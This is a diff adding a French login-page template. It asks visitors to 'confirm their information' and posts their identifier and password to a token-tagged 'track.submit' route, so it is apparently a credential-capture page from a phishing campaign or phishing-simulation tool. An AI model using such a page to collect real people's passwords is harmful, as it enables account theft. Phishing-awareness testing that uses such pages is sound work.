@@ -1,0 +1,29 @@
+<!doctype html>
+<html lang="fr">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Connexion</title>
+  <style>
+    body { font-family: Arial, sans-serif; background:#eef0f2; margin:0; }
+    .box { max-width:360px; margin:70px auto; background:#fff; padding:30px;
+           border-radius:8px; box-shadow:0 2px 10px rgba(0,0,0,.12); }
+    h2 { text-align:center; margin-top:0; }
+    input { width:100%; padding:11px; margin:8px 0; box-sizing:border-box;
+            border:1px solid #ccc; border-radius:4px; }
+    button { width:100%; padding:11px; background:#1a73e8; color:#fff;
+             border:0; border-radius:4px; font-size:1rem; cursor:pointer; }
+  </style>
+</head>
+<body>
+  <div class="box">
+    <h2>Connexion</h2>
+    <p>Veuillez confirmer vos informations pour continuer.</p>
+    <form method="post" action="{{ url_for('track.submit', token=token) }}">
+      <input type="text" name="identifier" placeholder="Numéro ou email" required>
+      <input type="password" name="secret" placeholder="Mot de passe" required>
+      <button type="submit">Se connecter</button>
+    </form>
+  </div>
+</body>
+</html>
